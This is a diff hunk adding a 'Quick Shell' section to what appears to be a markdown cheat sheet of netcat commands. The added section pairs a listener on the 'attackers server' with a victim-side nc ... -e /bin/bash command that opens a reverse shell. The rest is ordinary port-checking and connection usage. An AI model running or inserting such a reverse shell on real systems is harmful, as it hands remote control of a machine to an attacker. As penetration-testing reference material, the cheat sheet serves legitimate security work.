@@ -24,6 +24,17 @@ Connect to Listener
 nc xxx.xxx.xxx.xxx 3333
 ```
 
+Netcat - Quick Shell
+-------------------------------------------
+On attackers server
+```
+nc -lvvnp 1337
+```
+On victims server
+```
+nc <server> 1337 -e /bin/bash
+```
+
 Netcat - Check if a port is open
 -------------------------------------------
 TCP
